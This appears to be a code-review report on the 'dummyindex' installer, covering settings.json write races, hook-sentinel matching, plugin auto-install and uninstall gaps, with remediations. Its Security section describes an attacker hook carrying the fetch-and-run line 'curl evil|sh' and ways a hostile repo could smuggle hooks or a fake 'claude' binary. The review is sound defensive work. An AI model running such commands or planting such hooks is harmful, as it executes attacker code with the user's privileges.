## Data integrity

- **User-scope `CLAUDE.md` is NOT a managed-block — it's a naive substring guard + bare append, contradicting the plan.** The plan claims the "CLAUDE.md registration block is the same idea in markdown (`install.py:171-172`)" and "prior CLAUDE.md registration [is] never clobbered (`install.py:171-172`)" — but `install.py:171` gates on `if "dummyindex" in content` (any occurrence of the literal string anywhere — a code fence, a path, an unrelated note) and otherwise does `content.rstrip() + _SKILL_REGISTRATION` (`install.py:174-175`). This is **not** idempotent in the marker sense: it is non-reentrant (a file mentioning "dummyindex" for any reason is silently skipped → registration never lands) and non-updatable (the appended block is never refreshed on upgrade because the substring already matches). It also has no begin/end markers, so uninstall cannot ever remove it. Contrast the real managed block `bootstrap_claude_md` (`output/bootstrap.py:38-72`) which uses `BEGIN_MARKER`/`END_MARKER`, replaces in place, and raises `UnbalancedMarkersError` on duplicates. Code wins — flag the plan's `install.py:171-172` citation as a doc/code conflict (medium-confidence plan prose overstating the guarantee).

- **Two in-process writers + one external CLI writer race on the same `.claude/settings.json` via a shared `.tmp` path.** `_wire_default_plugins_step` runs `wire_default_plugins` (in-process read-merge-write of `enabledPlugins`, `default_plugins.py:158-167` → `enable_plugin` → `write_settings`) and then `install_default_plugins` (`install.py:379`), which shells out to `claude plugin install ... --scope project` (`default_plugins.py:275-278`) — and the `claude` CLI writes the **same** project `settings.json`. The in-process `write_settings` did its read-merge-write before the CLI ran, so any key the CLI adds (or the marketplace-add step writes) is on a stale base relative to nothing here, but the reverse ordering on a *repeat* run, or a concurrent SessionStart hook, is a lost-update window: read-merge-write is not atomic across processes, only the final `tmp.replace` is. No file lock guards `enabledPlugins` vs. the CLI's own merge. Low-probability but it can silently drop a just-written key.

- **`write_settings` uses a fixed `<suffix>.tmp` sidecar — no uniqueness, so concurrent settings writers clobber each other's temp file.** `write_settings` (`claude_settings.py:174-178`) writes `settings_path.with_suffix(".json.tmp")` then `tmp.replace`. Hooks (`hooks.py` → `install_hook_entry` → `write_settings`) and plugins (`enable_plugin` → `write_settings`) target the **same** `settings.json` and therefore the **same** `settings.json.tmp`. Auto-init calls them sequentially (`install.py:275-276`) so single-run is safe, but two `dummyindex` processes (or a SessionStart hook firing mid-install) interleave on one tmp path → a half-written tmp can be `replace`d into place. The data-access convention mandates atomic tmp+replace (`conventions/data-access.md:5-7`) but does not address a *shared* tmp name; this writer is below the canonical `write_text_atomic` and reimplements its own (no `os.getpid()`/`mkstemp` uniqueness).

- **Parse-failure handling is correct and consistent: refuse, never corrupt.** `load_settings` raises `MalformedSettingsError` on invalid JSON or non-object top level (`claude_settings.py:46-60`); every write path goes through it first, so an unparseable `settings.json` is left byte-for-byte intact. `wire_default_plugins` (`default_plugins.py:164-166`), `hooks.install` (`hooks.py:393-394`), `_scrub_legacy_claude_hooks` (`hooks.py:422-424`), and `uninstall` (`hooks.py:486-490`) each catch it and record an error rather than overwrite. `_already_decided` treats a malformed file as "no decision" (`default_plugins.py:129-130`) — correct (it never *writes* on that path). No silent-corruption path found here.

- **Managed-hook idempotency is sound, including the co-located-user-hook merge.** `install_hook_entry` matches our entry by `SENTINEL in command` and refreshes the body *per-hook* (canonical hooks first, user hooks appended, `claude_settings.py:91-108`), explicitly avoiding the v0.25.0 wholesale-replace bug that dropped a user hook co-located in our entry. `remove_hook_entries`/uninstall mirror it (strip only sentinel hooks, keep the entry if a user hook survives, `claude_settings.py:142-163`; `hooks.py:494-508`). User-authored hooks (no sentinel) are never touched (`hooks.py:339`). The `install` refreshed-vs-skipped classification compares on-disk bytes before/after (`hooks.py:382-392`) rather than against canonical body, so it reports honestly once a user co-locates a hook. No concern.

- **`DEFAULT_PLUGINS` dedup is structural, not runtime — a duplicated tuple entry would be written twice with no guard.** Dedup against the repo's prior decision is handled (`_already_decided`, `default_plugins.py:115-133`) and `enable_plugin` is a dict-keyed no-op when already `true` (`claude_plugins.py:148-150`), so the same `target` enabled twice in one run collapses naturally on the dict key. But the iteration over `DEFAULT_PLUGINS` (`default_plugins.py:154`, `:317`) does **not** dedup the tuple itself — two `DefaultPlugin` rows with the same `.target` would each be attempted (the second a harmless `enable_plugin` no-op, but it would still be double-counted into `enabled`/`installed` result tuples and double-printed). Today the tuple is a single entry (`default_plugins.py:60-62`) so this is latent only; flag it as a guard to add when the "one-line edit" to add a default lands, since `PluginWireResult.enabled` is a plain `tuple` with no set semantics.

- **Partial-install consistency: declaration and materialisation can diverge, by design, but the bool collapse hides hook failure.** The declaration (`enabledPlugins` write) and materialisation (`claude plugin install`) are deliberately split (`default_plugins.py:175-189`) so a deferred/failed CLI install still leaves a valid declaration — acceptable. Separately, `_install_project_hooks` returns `True` unconditionally even on a hook exception or recorded `errors` (`install.py:314,323`), so `_auto_init_project`'s return collapses to "build ran" regardless of hook/plugin outcome (also called out in plan Open-questions, `plan.md:127-129`). Consequence: a partial init (index built, hooks failed, settings unwritable) is indistinguishable from a clean one at the return-value boundary — callers must read stderr, not the bool. No data corruption, but the success signal over-reports.

## Security

- **THREAT 1 — Hook-command injection via `$CLAUDE_PROJECT_DIR` not being shell-quoted is mitigated, but the hook bodies execute as fully-trusted shell on every session-start and are sentinel-recognised by an attacker-controllable substring.** The managed hook commands embed `"$CLAUDE_PROJECT_DIR"` inside double quotes for every invocation (`hooks.py:97-98,107-108,123,136,152-153`), so the path itself can't break the argv — good. The real exposure is the *recognition + scrub* model: install/uninstall/status select "our" entries by the bare substring test `SENTINEL in (h.get("command") or "")` (`claude_settings.py:93,98,145`), and `SENTINEL = "DUMMYINDEX_AUTO_REFRESH"` (`hooks.py:48`) is a fixed, publicly-known literal embedded verbatim in the comment header (`hooks.py:54-56`). Attack path: a malicious repo (or a supply-chain commit) ships a `.claude/settings.json` whose own arbitrary hook command merely *contains* the string `DUMMYINDEX_AUTO_REFRESH` (e.g. in a comment) and a payload like `curl evil|sh`. On the victim's `dummyindex install`/upgrade, `install_hook_entry`'s preserve-merge treats that hook as one of OURS-or-not purely by substring: a hook that lacks the sentinel is *preserved verbatim* and re-emitted into the merged entry (`claude_settings.py:95-103`) — dummyindex never validates or sandboxes the user hook bodies it carries forward, and Claude Code will execute them with the user's full privileges on the next SessionStart/Stop. dummyindex is not the one *adding* the payload, but it is the component that silently re-writes attacker hook commands back into `settings.json` during a trusted "upgrade my tooling" operation, laundering them past a user who assumes `dummyindex install` only touches its own entries. Concrete remediation: (a) match managed entries on a structured key (e.g. a dedicated `"_dummyindex": true` field on the entry) rather than a substring anyone can spell; (b) when preserving co-located non-sentinel hooks, surface them to stderr ("preserving N user hook(s) in the dummyindex entry") so a re-emitted `curl|sh` is at least visible, not silent.

- **THREAT 2 — Plugin materialisation shells out to whatever `claude` is first on `PATH`, with a fixed-but-network-trusting argv, and a malicious repo can pre-decide a hostile `enabledPlugins` target that dummyindex then *installs*.** The subprocess itself is built safely: `default_runner` uses `subprocess.run(argv, ...)` with a list argv and the default `shell=False`, no string interpolation into a shell (`default_plugins.py:207-223`), and the argv is assembled from the frozen `DEFAULT_PLUGINS` tuple — today only `superpowers@claude-plugins-official` (`default_plugins.py:60-62,275-278`). So there is no classic argv-injection here and no invented CVE. The trust gaps are two: (i) **PATH trust** — `_claude_available` and every install call resolve the bare name `claude` (`default_plugins.py:246,267,276`) with `cwd=project_root`; on a repo containing a `./claude` executable, whether that runs depends on the inherited `PATH`, and dummyindex pins neither an absolute path nor `shell=False`-plus-no-`.`-on-PATH guarantee — a hostile repo that convinces a user to prepend `.` to PATH gets arbitrary code at `dummyindex install` time. (ii) **Declaration-then-install honours an attacker's pre-seeded decision** — `_already_decided` makes dummyindex treat any `enabledPlugins` key already present in the *committed* `settings.json` as sacrosanct and leaves it as-is (`default_plugins.py:115-133`), and the install loop only ever materialises the hardcoded `DEFAULT_PLUGINS`, so dummyindex won't itself install a foreign target — BUT the broader equip/plugin-manager path (out of this feature, same `enable_plugin` seam, `claude_plugins.py:138-152`) and Claude Code's own next-session reconcile *will* install whatever `enabledPlugins` declares. The danger is the framing: a user running `dummyindex install` on an untrusted clone reasonably believes only dummyindex's own opinionated default is enabled, while a pre-committed `enabledPlugins` block silently rides along untouched and gets installed by Claude Code. Remediation: resolve `claude` to an absolute path (or `shutil.which` with an explicit, sanitised PATH) before exec; and have `wire_default_plugins` warn (not silently `already`) when it finds *foreign* (non-`DEFAULT_PLUGINS`) `enabledPlugins` keys in a repo it's initialising, so a smuggled enable is disclosed.

- **THREAT 3 — `settings.json` is written world-default-permissioned and non-atomically at the write step, and the CLAUDE.md substring guard is a denial-of-registration / poisoning primitive.** Two concrete issues. (a) **Permissions + the write_text half-step:** `write_settings` does `tmp.write_text(...)` then `tmp.replace(settings_path)` (`claude_settings.py:176-178`). The `replace` is atomic for the *swap*, but the tmp file is created with the process umask (typically `0644`) — a `.claude/settings.json` that carries the user's hooks and enabled plugins (i.e. code that auto-executes every session) is left group/other-readable, and on a shared/multi-user host any local user can read which tooling and project paths the victim runs, and if `.claude/` is group-writable, race the fixed-name `settings.json.tmp` (see Data integrity §3) to land a hook of their choosing. dummyindex never `chmod 600`s the file it writes despite it being security-sensitive. (b) **CLAUDE.md poisoning:** because user-scope registration is gated on `if "dummyindex" in content` (`install.py:171`), an attacker who can write a single line containing the word `dummyindex` into `~/.claude/CLAUDE.md` permanently suppresses dummyindex's own registration block from ever being added or refreshed (and conversely, the bare `content.rstrip() + _SKILL_REGISTRATION` append at `install.py:174-175` has no marker, so nothing can later detect or remove a stale/forged block). This is low-severity (local, requires write to the user's own home) but it's a silent integrity gap: the install reports "already registered (no change)" (`install.py:172`) while the file may contain an attacker-forged or simply-broken registration. Remediation: write `settings.json` (and its tmp) with mode `0o600` via `os.open(..., 0o600)` / `os.chmod`; replace the CLAUDE.md substring guard with the same `BEGIN_MARKER`/`END_MARKER` managed block `bootstrap_claude_md` already uses (`output/bootstrap.py:38-72`) so registration is detectable, refreshable, and removable.

## Product surface

- **Uninstall is one-directional — it removes skills/commands but leaves every init side-effect behind.** `uninstall` (`uninstall.py:12-86`) deletes the skill tree, sibling skills, version stamp, and commands — but never touches the three managed init artefacts it wrote on install: the SessionStart/Stop hooks in `.claude/settings.json`, the project managed CLAUDE.md block, or the `enabledPlugins` declaration. The hooks module *has* the teardown (`hooks.uninstall`/`remove_hook_entries`, cited in concerns §Managed-hook), but `installer/uninstall.py` imports nothing from it. Observed behavior: after `dummyindex uninstall`, Claude Code still fires the dummyindex SessionStart hook (now pointing at a deleted skill → drift report errors every session), and the committed `enabledPlugins`/CLAUDE.md block ride on forever. Gap: a user who "removed dummyindex" still has its hooks executing and its plugin enabled, with no flag (no `--purge`/`--project`) to clean the repo wiring, and uninstall's final line "skill removed" implies a clean removal.

- **`--no-superpowers` opt-out is discoverable only by reading `install --help`; the default-enable is silent at the moment it happens.** The only opt-out for the bundled `superpowers` plugin is the `--no-superpowers` flag (`args.py:25,79-81`) or a persisted `config.json` value (`resolve_enabled`, `default_plugins.py:82-91`). On a default `dummyindex install` the plugin is enabled AND shelled-out-installed via the `claude` CLI (`default_plugins.py:317-322`) with the only signal being a one-line `plugins -> enabled superpowers@...` in the install log (`default_plugins.py:104-105`). Observed behavior: an installing user gets a third-party plugin enabled and materialised into `~/.claude/plugins/` without an interactive prompt and without the log explaining what superpowers is or how to opt out. Gap: no inline "(opt out with --no-superpowers)" hint next to the enable line, and no mention in the post-install "Done." summary — the opt-out exists but is invisible unless you already knew to look for it.

- **Unparseable `settings.json` is correctly non-destructive but the install still reports overall success — the user is never told wiring was skipped.** When `.claude/settings.json` is malformed, `wire_default_plugins` records the `MalformedSettingsError` into `errors` (`default_plugins.py:164-166`) and `hooks.install` does the same (per concerns §Parse-failure) — the file is left intact (good). But these surface only as `plugins warning (...)` / hook-warning lines on stderr (`default_plugins.py:110-111`), while `_install_project_hooks` still returns `True` (`install.py:303-323`, per concerns §Partial-install) and the command prints the cheerful "Done. Open Claude Code..." footer (`install.py:198-207`) and exits 0. Observed behavior: with a broken settings.json, the SessionStart drift hook silently does NOT get installed and the plugin is NOT enabled, yet the terminal says "Done." with no aggregate "N steps failed — your settings.json is malformed, fix it and re-run" callout. Gap: warnings are easy to miss in a wall of stdout; there is no non-zero exit and no consolidated failure summary pointing at the malformed file as the root cause.

- **Re-install / upgrade re-runs the full init every time and re-enables a default the team may have intentionally removed — but only if they *deleted* the key, not set it false.** `_already_decided` treats `enabledPlugins[target]` present-and-`false` as a decision and leaves it (`default_plugins.py:115-133`) — so an explicit opt-out survives upgrade. But a team that removed the `superpowers` key entirely (e.g. hand-pruned settings.json, or migrated config) reads as "no decision" and the next `dummyindex install` / `/dummyindex-update` silently re-enables and re-installs it (`default_plugins.py:154-167`). Observed behavior: on every upgrade, a repo with no `superpowers` key gets the plugin re-added and re-materialised via the `claude` CLI; the only way to make removal stick is the non-obvious `enabledPlugins.superpowers = false` tombstone. Gap: "deleted the key" and "never decided" are indistinguishable, so opt-out-by-deletion silently reverts on the next upgrade — a surprising side effect for a command framed as non-destructive.

- **`--scope project` installs skill+commands into the repo but the user-scope CLAUDE.md skill registration is skipped — discoverability of `/dummyindex` then depends entirely on the project managed block.** The CLAUDE.md *registration* append (`install.py:167-181`) is gated on `scope == "user"`; under `--scope project` it is never written, and the project managed block is only bootstrapped if the target is a git repo via auto-init (`install.py:271-272`). Observed behavior: `dummyindex install --scope project --dir <non-repo>` lands the skill but registers it in no CLAUDE.md anywhere — the `/dummyindex` trigger guidance is absent. Gap: a project-scope install into a non-repo dir leaves the skill present but undiscovered, and the install log never says "skill not registered in any CLAUDE.md for this scope."

## Cross-review notes

The Security review flagged two operator-facing primitives that compound the product-surface gaps above:

- **Sentinel-substring laundering meets one-directional uninstall.** Security §THREAT 1 shows `dummyindex install`/upgrade re-emits any co-located non-sentinel hook verbatim while preserving the managed entry (`claude_settings.py:95-103`). Combined with the Product-surface finding that `uninstall.py` never removes hooks at all, the operator impact is: a hook body that rode in (laundered or user-authored) on one upgrade is *never* cleaned by `dummyindex uninstall` — the only removal path (`hooks.uninstall`) is unreachable from the uninstall verb. An operator who "removed dummyindex to stop its hooks" still has the managed entry — and anything co-located in it — executing every session. The structured-key remediation (a `_dummyindex: true` field) should land together with wiring `installer/uninstall.py` to the existing `hooks.uninstall`.

- **Bare-`claude` PATH resolution fires on the silent default-enable path.** Security §THREAT 2 notes `_claude_available`/install resolve the bare name `claude` with `cwd=project_root` (`default_plugins.py:246,267,276`). Operator impact via the Product surface: because the superpowers default-install is silent and opt-out is invisible (finding §2), the subprocess that resolves `claude` from PATH runs on *every* default install/upgrade without the user electing into it — so the PATH-trust exposure is on the default path, not an opt-in one. Resolving to an absolute `claude` (or `shutil.which` with a sanitised PATH) and surfacing the materialisation step in the log would make the network/exec side-effect both safer and visible.
